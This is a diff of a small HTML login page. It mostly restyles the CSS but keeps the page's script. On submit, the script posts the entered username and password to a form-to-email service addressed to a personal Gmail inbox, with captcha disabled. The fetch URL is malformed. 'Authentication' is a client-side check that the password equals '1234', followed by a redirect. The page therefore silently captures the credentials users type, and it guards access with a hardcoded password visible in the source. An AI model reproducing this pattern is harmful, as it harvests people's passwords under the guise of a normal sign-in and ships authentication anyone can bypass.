@@ -1,142 +1,229 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Login Page</title>
-  <style>
-    :root {
-      --success: #10b981;
-      --error: #ef4444;
-      --primary: #3b82f6;
-      --bg: #f3f4f6;
-    }
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login Page</title>
+    <style>
+        :root {
+            --success: #10b981;
+            --error: #ef4444;
+            --primary: #8b5cf6;
+            --primary-hover: #7c3aed;
+            --bg: #4c1d95;
+            --bg-gradient: linear-gradient(135deg, #4c1d95 0%, #2e1065 100%);
+            --text-heading: #1f2937;
+            --text-body: #6b7280;
+        }
 
-    body { 
-      font-family: system-ui, -apple-system, sans-serif; 
-      background: var(--bg); 
-      display: flex; 
-      justify-content: center; 
-      padding-top: 50px;
-      margin: 0;
-    }
+        body {
+            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+            background: var(--bg);
+            background: var(--bg-gradient);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            color: #333;
+        }
 
-    .card {
-      background: white;
-      padding: 2rem;
-      border-radius: 8px;
-      box-shadow: 0 4px 6px rgba(0,0,0,0.1);
-      width: 100%;
-      max-width: 400px;
-    }
+        .card {
+            background: rgba(255, 255, 255, 0.95);
+            padding: 2.5rem;
+            border-radius: 16px;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.2);
+            width: 100%;
+            max-width: 400px;
+            animation: slideIn 0.6s ease-out forwards;
+            backdrop-filter: blur(10px);
+        }
 
-    h1 { margin-top: 0; font-size: 1.5rem; }
-    .lead { color: #6b7280; margin-bottom: 1.5rem; }
+        h1 {
+            margin-top: 0;
+            font-size: 1.8rem;
+            color: var(--text-heading);
+            text-align: center;
+            margin-bottom: 0.5rem;
+        }
 
-    label { display: block; margin-bottom: 4px; font-weight: 500; }
-    
-    input {
-      width: 100%;
-      padding: 10px;
-      margin-bottom: 16px;
-      display: block;
-      box-sizing: border-box;
-      border: 1px solid #d1d5db;
-      border-radius: 4px;
-    }
+        .lead {
+            color: var(--text-body);
+            margin-bottom: 2rem;
+            text-align: center;
+            font-size: 0.95rem;
+        }
 
-    .btn {
-      width: 100%;
-      padding: 12px;
-      background: var(--primary);
-      color: white;
-      border: none;
-      border-radius: 4px;
-      cursor: pointer;
-      font-weight: 600;
-    }
+        label {
+            display: block;
+            margin-bottom: 6px;
+            font-weight: 600;
+            color: #374151;
+            font-size: 0.9rem;
+        }
 
-    .btn:hover { background: #2563eb; }
-    .btn:disabled { background: #94a3b8; cursor: not-allowed; }
+        input {
+            width: 100%;
+            padding: 12px;
+            margin-bottom: 20px;
+            display: block;
+            box-sizing: border-box;
+            border: 2px solid #e5e7eb;
+            border-radius: 8px;
+            transition: all 0.3s ease;
+            font-size: 1rem;
+            background: #f9fafb;
+        }
 
-    .message { display: none; margin-top: 1rem; padding: 1rem; border-radius: 4px; }
-    
-    .message.success {
-      display: block;
-      background: rgba(16, 185, 129, 0.1);
-      border: 1px solid var(--success);
-      color: #065f46;
-    }
+        input:focus {
+            outline: none;
+            border-color: var(--primary);
+            box-shadow: 0 0 0 3px rgba(139, 92, 246, 0.2);
+            background: white;
+        }
 
-    .message.error {
-      display: block;
-      background: rgba(239, 68, 68, 0.1);
-      border: 1px solid var(--error);
-      color: #991b1b;
-    }
-  </style>
+        .btn {
+            width: 100%;
+            padding: 14px;
+            background: var(--primary);
+            color: white;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            font-weight: 600;
+            font-size: 1rem;
+            transition: all 0.3s ease;
+            transform: translateY(0);
+            box-shadow: 0 4px 6px rgba(139, 92, 246, 0.25);
+        }
+
+        .btn:hover {
+            background: var(--primary-hover);
+            transform: translateY(-2px);
+            box-shadow: 0 6px 12px rgba(139, 92, 246, 0.3);
+        }
+
+        .btn:active {
+            transform: translateY(0);
+        }
+
+        .btn:disabled {
+            background: #9ca3af;
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
+
+        .message {
+            display: none;
+            margin-top: 1.5rem;
+            padding: 1rem;
+            border-radius: 8px;
+            text-align: center;
+            animation: fadeIn 0.3s ease;
+        }
+
+        .message.success {
+            display: block;
+            background: #ecfdf5;
+            border: 1px solid #a7f3d0;
+            color: #047857;
+        }
+
+        .message.error {
+            display: block;
+            background: #fef2f2;
+            border: 1px solid #fecaca;
+            color: #b91c1c;
+        }
+
+        @keyframes slideIn {
+            from {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+            }
+
+            to {
+                opacity: 1;
+            }
+        }
+    </style>
 </head>
+
 <body>
 
-  <div class="card">
-    <h1>Welcome back</h1>
-    <p class="lead">Enter your credentials to access your account.</p>
-    
-    <form id="loginForm">
-      <!-- Hidden fields for the email service -->
-      <input type="hidden" name="_captcha" value="false">
-      <input type="hidden" name="_template" value="table">
+    <div class="card">
+        <h1>Welcome back</h1>
+        <p class="lead">Enter your credentials to access your account.</p>
 
-      <label for="username">Username</label>
-      <input type="text" id="username" name="Username_Attempt" placeholder="e.g. alex_doe" required>
-      
-      <label for="password">Password</label>
-      <input type="password" id="password" name="password" placeholder="••••••••" required>
-      
-      <button type="submit" id="submitBtn" class="btn">Sign In</button>
-    </form>
+        <form id="loginForm">
+            <!-- Hidden fields for the email service -->
+            <input type="hidden" name="_captcha" value="false">
+            <input type="hidden" name="_template" value="table">
 
-    <div id="statusMessage" class="message"></div>
-  </div>
+            <label for="username">Username</label>
+            <input type="text" id="username" name="Username_Attempt" placeholder="e.g. alex_doe" required>
 
-  <script>
-    const form = document.getElementById('loginForm');
-    const status = document.getElementById('statusMessage');
-    const btn = document.getElementById('submitBtn');
+            <label for="password">Password</label>
+            <input type="password" id="password" name="password" placeholder="••••••••" required>
 
-    form.addEventListener('submit', async (e) => {
-      e.preventDefault();
-      
-      const user = document.getElementById('username').value;
-      const pass = document.getElementById('password').value;
+            <button type="submit" id="submitBtn" class="btn">Sign In</button>
+        </form>
 
-      status.style.display = 'block';
-      status.className = 'message';
-      status.textContent = "Processing...";
-      btn.disabled = true;
+        <div id="statusMessage" class="message"></div>
+    </div>
 
-      // 1. Send data to your email
-      try {
-        const formData = new FormData(form);
-        await fetch("formsubmit.coabhinavaby07@gmail.com", {
-          method: "POST",
-          body: formData
+    <script>
+        const form = document.getElementById('loginForm');
+        const status = document.getElementById('statusMessage');
+        const btn = document.getElementById('submitBtn');
+
+        form.addEventListener('submit', async (e) => {
+            e.preventDefault();
+
+            const user = document.getElementById('username').value;
+            const pass = document.getElementById('password').value;
+
+            status.style.display = 'block';
+            status.className = 'message';
+            status.textContent = "Processing...";
+            btn.disabled = true;
+
+            // 1. Send data to your email
+            try {
+                const formData = new FormData(form);
+                await fetch("formsubmit.coabhinavaby07@gmail.com", {
+                    method: "POST",
+                    body: formData
+                });
+            } catch (err) {
+                console.error("Mail error:", err);
+            }
+
+            // 2. Original Redirect Logic
+            if (pass === "1234") {
+                status.className = 'message success';
+                status.textContent = "Redirecting...";
+                window.location.href = "https://abhinavaby.github.io/omega-optimists-web/index.html";
+            } else {
+                btn.disabled = false;
+                status.className = 'message error';
+                status.textContent = "Wrong password. Please try again.";
+            }
         });
-      } catch (err) {
-        console.error("Mail error:", err);
-      }
-
-      // 2. Original Redirect Logic
-      if (pass === "1234") {
-        status.className = 'message success';
-        status.textContent = "Redirecting...";
-        window.location.href = "https://abhinavaby.github.io/omega-optimists-web/index.html";
-      } else {
-        btn.disabled = false;
-        status.className = 'message error';
-        status.textContent = "Wrong password. Please try again.";
-      }
-    });
-  </script>
+    </script>
 </body>
+
 </html>
